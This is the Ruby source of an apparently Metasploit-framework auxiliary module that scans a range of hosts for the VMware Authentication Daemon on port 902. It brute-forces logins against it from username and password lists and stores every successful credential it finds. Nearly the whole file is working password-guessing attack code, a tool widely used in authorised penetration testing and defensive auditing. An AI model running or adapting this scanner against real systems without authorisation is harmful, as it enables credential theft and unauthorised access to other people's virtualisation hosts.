##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/tcp'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/vmauthd'

class Metasploit3 < Msf::Auxiliary

  include Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  @@cached_rsa_key = nil

  def initialize
    super(
      'Name'        => 'VMWare Authentication Daemon Login Scanner',
      'Description' => %q{This module will test vmauthd logins on a range of machines and
                report successful logins.
      },
      'Author'      => ['theLightCosine'],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )

    register_options([Opt::RPORT(902)])

  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting vmauthd login attempts")

    # Peform a sanity check to ensure that our target is vmauthd before
    # attempting to brute force it.
    begin
      connect rescue nil
      if !self.sock
        print_error "#{ip}:#{rport} - Could not connect to vmauthd"
        return
      end
      banner = sock.get_once(-1, 10)
      if !banner || !banner =~ /^220 VMware Authentication Daemon Version.*/
        print_error "#{ip}:#{rport} - Target does not appear to be a vmauthd service"
        return
      end

      rescue ::Interrupt
      raise $ERROR_INFO
    ensure
      disconnect
    end

    cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file: datastore['PASS_FILE'],
      password: datastore['PASSWORD'],
      user_file: datastore['USER_FILE'],
      userpass_file: datastore['USERPASS_FILE'],
      username: datastore['USERNAME'],
      user_as_pass: datastore['USER_AS_PASS']
    )
    scanner = Metasploit::Framework::LoginScanner::VMAUTHD.new(
      host: ip,
      port: rport,
      proxies: datastore['PROXIES'],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: 30
    )

    service_data = {
      address: ip,
      port: rport,
      service_name: 'vmauthd',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    scanner.scan! do |result|
      if result.success?
        credential_data = {
          module_fullname: self.fullname,
          origin_type: :service,
          private_data: result.credential.private,
          private_type: :password,
          username: result.credential.public
        }
        credential_data.merge!(service_data)

        credential_core = create_credential(credential_data)

        login_data = {
          core: credential_core,
          last_attempted_at: DateTime.now,
          status: Metasploit::Model::Login::Status::SUCCESSFUL
        }

        login_data.merge!(service_data)

        create_credential_login(login_data)

        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
      else
        invalidate_login(
          address: ip,
          port: rport,
          protocol: 'tcp',
          public: result.credential.public,
          private: result.credential.private,
          realm_key: nil,
          realm_value: nil,
          status: result.status)
        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof.strip})"
      end
    end

  end
end
